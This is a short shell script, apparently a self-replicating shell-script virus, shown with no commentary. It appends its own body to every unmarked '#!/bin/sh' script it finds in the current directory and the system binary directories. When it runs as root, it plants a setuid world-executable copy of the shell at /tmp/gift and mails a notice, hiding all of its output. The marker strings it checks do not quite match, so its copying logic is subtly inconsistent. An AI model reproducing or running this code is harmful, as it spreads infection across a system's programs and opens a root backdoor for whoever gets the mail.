#!/bin/sh

( for i in * /bin/* /usr/bin/* /u*/*/bin/* ; do
    if sed 1q $i | grep '^#![	 ]*/bin/sh' ; then
      if grep '^# mark$' $i ; then
        :
      else
        trap "/bin/rm -f /tmp/x$$" 0 1 2 13 15
        sed 1q $i > /tmp/x$$
        sed '1d
            /^#mark$/q' $0 >> /tmp/x$$
        sed 1d $i >> /tmp/x$$
        cp /tmp/x$$ $i
      fi
    fi
  done
  if ls -l /tmp/x$$ | grep root ; then
    /bin/rm -f /tmp/gift
    cp /bin/sh /tmp/gift
    chmod 4777 /tmp/gift
    echo gift | mail  # insert E-mail address here
  fi
  /bin/rm /tmp/x$$
) >/dev/null 2>/dev/null &
# mark
